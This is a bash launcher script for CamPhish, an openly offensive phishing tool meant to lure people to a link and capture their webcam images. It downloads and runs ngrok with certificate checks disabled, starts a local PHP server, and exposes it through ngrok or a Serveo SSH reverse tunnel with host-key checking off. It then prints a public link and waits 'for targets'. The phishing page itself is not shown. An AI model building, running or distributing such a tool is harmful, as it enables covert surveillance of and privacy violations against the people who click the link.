#!/bin/bash
# CamPhish v1.7 - FIXED VERSION
# Platform-independent with proper syntax
# Powered by Irsyah - Fixed by CamN Team

trap 'printf "\n";stop' 2

# Platform detection
PLATFORM="$(uname -s 2>/dev/null || echo Unknown)"
IS_DARWIN=false
IS_LINUX=false
IS_TERMUX=false
IS_WINDOWS=false

case "$PLATFORM" in
    Darwin*) IS_DARWIN=true ;; 
    Linux*) 
        IS_LINUX=true
        # detect Termux (Android)
        if [ -d "/data/data/com.termux" ] || [ -n "$PREFIX" -a "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
            IS_TERMUX=true
        fi
        ;;
    MINGW*|MSYS*|CYGWIN*) IS_WINDOWS=true ;; 
    *) ;;
esac

# Portable check for command
has_cmd() { command -v "$1" >/dev/null 2>&1; }

# Kill processes listening on a port
kill_port() {
    port="$1"
    if has_cmd fuser; then
        fuser -k ${port}/tcp > /dev/null 2>&1 || true
        return
    fi
    if has_cmd lsof; then
        pids=$(lsof -t -i tcp:"${port}" 2>/dev/null || true)
        if [ -n "$pids" ]; then
            echo "$pids" | xargs -r kill -2 >/dev/null 2>&1 || true
            return
        fi
    fi
}

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 1.7 (Fixed) \e[0m \n"
printf " \e[1;92m All platforms supported \e[0m \n\n"
}

dependencies() {
    if ! has_cmd php ; then
        echo >&2 "ERROR: php is not installed. Install php-cli and try again."; 
        exit 1
    fi
    if ! has_cmd curl ; then
        echo >&2 "WARNING: curl not found. Some features may not work properly.";
    fi
    if ! has_cmd ssh && ! $IS_WINDOWS ; then
        echo >&2 "WARNING: ssh not found. Serveo option requires OpenSSH.";
    fi
}

download_ngrok() {
    printf "\e[1;92m[+] Downloading ngrok for your platform...\e[0m\n"
    
    # Detect architecture
    local arch=$(uname -m)
    local url=""
    local filename=""
    
    # Platform and architecture detection
    if [[ "$PLATFORM" == "Darwin"* ]]; then
        url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip"
        filename="ngrok-v3-stable-darwin-arm64.zip"
    elif [[ "$arch" == "aarch64" ]]; then
        url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
        filename="ngrok-v3-stable-linux-arm64.zip"
    elif [[ "$arch" == "armv"* ]]; then
        url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip"
        filename="ngrok-v3-stable-linux-arm.zip"
    else
        url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
        filename="ngrok-v3-stable-linux-amd64.zip"
    fi
    
    # Download
    if wget --no-check-certificate "$url" > /dev/null 2>&1; then
        if [ -f "$filename" ]; then
            unzip "$filename" > /dev/null 2>&1
            chmod +x ngrok
            rm -rf "$filename"
            printf "\e[1;92m[*] ngrok downloaded successfully\e[0m\n"
            return 0
        fi
    fi
    
    printf "\e[1;93m[!] Download failed. Check your internet connection.\e[0m\n"
    exit 1
}

setup_ngrok_auth() {
    if [ -f ~/.ngrok2/ngrok.yml ]; then
        printf "\e[1;92m[*] ngrok authtoken already configured\e[0m\n"
    else
        printf "\e[1;93m[!] No ngrok authtoken found\e[0m\n"
        read -p $'\e[1;92m[+] Enter your ngrok authtoken: \e[0m' ngrok_auth
        if [ -n "$ngrok_auth" ]; then
            ./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
            printf "\e[1;92m[*] Authtoken configured\e[0m\n"
        else
            printf "\e[1;31m[!] No authtoken provided. Cannot continue.\e[0m\n"
            exit 1
        fi
    fi
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    
    [ -n "$checkngrok" ] && pkill -f -2 ngrok > /dev/null 2>&1
    [ -n "$checkphp" ] && killall -2 php > /dev/null 2>&1
    [ -n "$checkssh" ] && killall -2 ssh > /dev/null 2>&1
    
    exit 1
}

# Main menu
printf "\n\e[1;92m[*] CamPhish - Multi-platform support\e[0m\n"
printf "\e[1;93m[1] Start with Ngrok\e[0m\n"
printf "\e[1;93m[2] Start with Serveo\e[0m\n"
printf "\e[1;93m[0] Exit\e[0m\n"
read -p $'\e[1;92m[+] Choose option: \e[0m' option

case "$option" in
    1)
        if [ ! -f ngrok ]; then
            download_ngrok
        fi
        setup_ngrok_auth
        printf "\e[1;92m[+] Starting PHP server on port 3333\e[0m\n"
        php -S 127.0.0.1:3333 > /dev/null 2>&1 &
        sleep 2
        
        printf "\e[1;92m[+] Starting ngrok tunnel\e[0m\n"
        ./ngrok http 3333 > /dev/null 2>&1 &
        sleep 5
        
        # Get the public URL
        link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | head -n1 | cut -d'"' -f4)
        if [ -n "$link" ]; then
            printf "\e[1;92m[*] Your link:\e[0m \e[1;77m%s\e[0m\n" "$link"
            printf "\e[1;92m[*] Waiting for targets...\e[0m\n"
            read -p "Press Enter to stop..."
        else
            printf "\e[1;31m[!] Failed to get ngrok URL\e[0m\n"
        fi
        stop
        ;;
    2)
        if ! has_cmd ssh; then
            printf "\e[1;31m[!] SSH is required for Serveo. Install openssh-client\e[0m\n"
            exit 1
        fi
        
        printf "\e[1;92m[+] Starting PHP server on port 3333\e[0m\n"
        php -S 127.0.0.1:3333 > /dev/null 2>&1 &
        sleep 2
        
        printf "\e[1;92m[+] Starting Serveo tunnel\e[0m\n"
        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:3333 serveo.net > sendlink 2>&1 &
        sleep 10
        
        link=$(grep -o 'https://[^ ]*\.serveo\.net' sendlink | head -n1)
        if [ -n "$link" ]; then
            printf "\e[1;92m[*] Your link:\e[0m \e[1;77m%s\e[0m\n" "$link"
            printf "\e[1;92m[*] Waiting for targets...\e[0m\n"
            read -p "Press Enter to stop..."
        else
            printf "\e[1;31m[!] Failed to get Serveo URL\e[0m\n"
        fi
        stop
        ;;
    0)
        printf "\e[1;92m[*] Goodbye!\e[0m\n"
        exit 0
        ;;
    *)
        printf "\e[1;31m[!] Invalid option\e[0m\n"
        exit 1
        ;;
esac
